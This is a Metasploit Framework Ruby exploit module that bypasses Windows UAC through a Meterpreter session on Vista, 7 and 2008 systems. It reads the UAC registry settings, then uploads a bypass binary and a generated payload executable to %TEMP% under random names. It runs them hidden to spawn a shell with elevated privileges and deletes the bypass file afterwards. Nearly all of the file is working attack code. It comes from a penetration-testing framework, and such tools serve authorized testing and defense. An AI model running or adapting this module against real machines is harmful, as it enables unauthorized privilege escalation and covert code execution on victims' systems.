##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Post::Common
	include Exploit::EXE
	include Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Escalate UAC Protection Bypass',
			'Description'   => %q{
				This module will bypass Windows UAC by utilizing the trusted publisher
				certificate through process injection. It will spawn a second shell that
				has the UAC flag turned off.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [
					'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
					'mitnick',
					'mubix <mubix[at]hak5.org>' # Port to local exploit
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets'       => [ [ 'Windows', {} ] ],
			'DefaultTarget' => 0,
			'References'    => [
				[ 'URL', ' http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]
			],
			'DisclosureDate'=> "Dec 31, 2010"
		))

	end

	def exploit


		#
		# Verify use against Vista+
		#
		vuln = false
		winver = sysinfo["OS"]
		affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
		affected.each { |v|
			if winver.include? v
				vuln = true
			end
		}
		if not vuln
			print_error("#{winver} does not have UAC")
			return
		end

		root_key, base_key = session.sys.registry.splitkey("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
		open_key = session.sys.registry.open_key(root_key, base_key)
		lua_setting = open_key.query_value('EnableLUA')

		if lua_setting.data == 1
			print_status "UAC is Enabled, checking level..."
		else
			print_error "UAC is not enabled, no reason to run module, exiting..."
			print_error "Run exploit/windows/local/ask to elevate"
			return
		end

		uac_level = open_key.query_value('ConsentPromptBehaviorAdmin')

		case uac_level.data
		when 2
			print_error "UAC is set to 'Always Notify'"
			print_error "This module does not bypass this setting, exiting..."
			return
		when 5
			print_good "UAC is set to Default"
			print_good "BypassUAC can bypass this setting, continuing..."
		when 0
			print_error "UAC is not enabled, no reason to run module"
			print_error "Run exploit/windows/local/ask to elevate"
			return
		end

		#
		# Generate payload and random names for upload
		#
		payload = generate_payload_exe

		# randomize the bypass_uac_filename
		bypass_uac_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# randomize the payload exe name
		payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# path to the bypassuac binary
		path = ::File.join(Msf::Config.install_root, "data", "post")

		# decide, x86 or x64
		bpexe = nil
		if sysinfo["Architecture"] =~ /wow64/i
			bpexe = ::File.join(path, "bypassuac-x64.exe")
		else
			bpexe = ::File.join(path, "bypassuac-x86.exe")
		end

		tmpdir = session.fs.file.expand_path("%TEMP%")
		cmd = "#{tmpdir}\\#{bypass_uac_filename} /c %TEMP%\\#{payload_filename}"

		print_status("Uploading the bypass UAC executable to the filesystem...")

		begin
			#
			# Upload UAC bypass to the filesystem
			#
			session.fs.file.upload_file("%TEMP%\\#{bypass_uac_filename}", bpexe)
			print_status("Meterpreter stager executable #{payload.length} bytes long being uploaded..")
			#
			# Upload the payload to the filesystem
			#
			tempexe = tmpdir + "\\" + payload_filename
			fd = client.fs.file.new(tempexe, "wb")
			fd.write(payload)
			fd.close
		rescue ::Exception => e
			print_error("Error uploading file #{bypass_uac_filename}: #{e.class} #{e}")
			return
		end

		print_status("Uploaded the agent to the filesystem....")

		# execute the payload
		session.sys.process.execute(cmd, nil, {'Hidden' => true})

		# delete the uac bypass payload
		delete_file = "cmd.exe /c del #{tmpdir}\\#{bypass_uac_filename}"

		session.sys.process.execute(delete_file, nil, {'Hidden' => true})
	end
end

